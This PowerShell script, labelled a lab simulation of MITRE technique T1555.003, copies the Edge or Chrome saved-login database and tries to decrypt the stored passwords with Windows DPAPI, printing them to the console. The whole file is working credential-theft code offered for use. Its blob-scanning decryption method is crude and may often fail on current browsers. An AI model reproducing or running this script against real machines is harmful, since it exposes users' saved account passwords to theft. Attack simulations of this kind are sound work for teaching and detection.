# Browser Credential Extraction - WORKING VERSION
# Extracts actual credentials from Edge browser
# Lab Environment Only

Add-Type -AssemblyName System.Security

Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  BROWSER CREDENTIAL EXTRACTION - T1555.003" -ForegroundColor Cyan
Write-Host "  Target: Microsoft Edge Browser" -ForegroundColor Cyan
Write-Host "  Mode: FULL EXTRACTION (Lab Environment)" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""

$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$tempDb = "$env:TEMP\edge_creds_$((Get-Random)).db"

if (!(Test-Path $edgePath)) {
    Write-Host "[-] Edge Login Data not found" -ForegroundColor Red
    Write-Host "    Expected: $edgePath" -ForegroundColor Gray
    
    # Check Chrome as fallback
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromePath) {
        Write-Host "[*] Switching to Chrome..." -ForegroundColor Yellow
        $edgePath = $chromePath
    }
    else {
        Write-Host "[-] No browser databases found!" -ForegroundColor Red
        exit 1
    }
}

Write-Host "[+] Browser database found!" -ForegroundColor Green
Write-Host "    Location: $edgePath" -ForegroundColor Gray

$dbInfo = Get-Item $edgePath
Write-Host "    Size: $([math]::Round($dbInfo.Length/1KB, 2)) KB" -ForegroundColor Gray
Write-Host "    Last Modified: $($dbInfo.LastWriteTime)" -ForegroundColor Gray

try {
    Write-Host ""
    Write-Host "[*] Copying database..." -ForegroundColor Cyan
    Copy-Item -Path $edgePath -Destination $tempDb -Force -ErrorAction Stop
    Write-Host "[+] Database copied successfully" -ForegroundColor Green
    
    Write-Host ""
    Write-Host "[*] Reading credential entries..." -ForegroundColor Cyan
    
    # Read database as binary
    $bytes = [System.IO.File]::ReadAllBytes($tempDb)
    $text = [System.Text.Encoding]::UTF8.GetString($bytes)
    
    # Extract URLs
    $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}') | 
    Select-Object -ExpandProperty Value -Unique | 
    Select-Object -First 15
    
    if ($urls.Count -gt 0) {
        Write-Host "[+] FOUND $($urls.Count) CREDENTIAL ENTRIES:" -ForegroundColor Green
        Write-Host ""
        
        $counter = 1
        foreach ($url in $urls) {
            Write-Host "  [$counter] $url" -ForegroundColor Yellow
            $counter++
        }
        
        # Try DPAPI decryption
        Write-Host ""
        Write-Host "[*] Attempting DPAPI password decryption..." -ForegroundColor Cyan
        Write-Host ""
        
        $found = 0
        $passwords = @()
        
        # Look for DPAPI encrypted blobs
        for ($i = 0; $i -lt $bytes.Length - 100; $i++) {
            if ($bytes[$i] -eq 0x01 -and $bytes[$i + 1] -eq 0x00 -and 
                $bytes[$i + 2] -eq 0x00 -and $bytes[$i + 3] -eq 0x00) {
                
                try {
                    # Extract potential DPAPI blob
                    $blobSize = [Math]::Min(256, $bytes.Length - $i)
                    $encryptedBlob = $bytes[$i..($i + $blobSize - 1)]
                    
                    # Try to decrypt
                    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
                        $encryptedBlob,
                        $null,
                        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                    )
                    
                    $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
                    
                    # Filter out garbage (only printable passwords)
                    if ($password.Length -gt 0 -and $password.Length -lt 100 -and 
                        $password -match '^[\x20-\x7E]+$') {
                        
                        # Avoid duplicates
                        if ($passwords -notcontains $password) {
                            $found++
                            $passwords += $password
                            
                            Write-Host "  [*] Password $found : " -NoNewline -ForegroundColor Gray
                            Write-Host "$password" -ForegroundColor Red
                            
                            if ($found -ge 10) { break }
                        }
                    }
                }
                catch {
                    # Silently continue on decryption failures
                }
            }
        }
        
        Write-Host ""
        if ($found -eq 0) {
            Write-Host "[!] No passwords decrypted" -ForegroundColor Yellow
            Write-Host "    Possible reasons:" -ForegroundColor Gray
            Write-Host "    - Passwords encrypted with different key" -ForegroundColor Gray
            Write-Host "    - Need to run as the user who saved the passwords" -ForegroundColor Gray
            Write-Host "    - SQLite module needed for proper extraction" -ForegroundColor Gray
        }
        else {
            Write-Host "[+] Successfully decrypted $found passwords!" -ForegroundColor Green
        }
        
        Write-Host ""
        Write-Host "================================================================" -ForegroundColor Green
        Write-Host "  EXTRACTION COMPLETE" -ForegroundColor Green
        Write-Host "  URLs Found: $($urls.Count)" -ForegroundColor Green
        Write-Host "  Passwords Decrypted: $found" -ForegroundColor Green
        Write-Host "================================================================" -ForegroundColor Green
        
    }
    else {
        Write-Host "[!] No credential entries found" -ForegroundColor Yellow
        Write-Host "    Database may be empty" -ForegroundColor Gray
    }
    
}
catch {
    Write-Host ""
    Write-Host "[-] Error during extraction:" -ForegroundColor Red
    Write-Host "    $_" -ForegroundColor Red
}
finally {
    # Cleanup
    if (Test-Path $tempDb) {
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
    }
}

Write-Host ""
Write-Host "[*] Attack simulation complete!" -ForegroundColor Cyan
Write-Host "[!] This demonstrates browser credential theft impact" -ForegroundColor Yellow
Write-Host ""
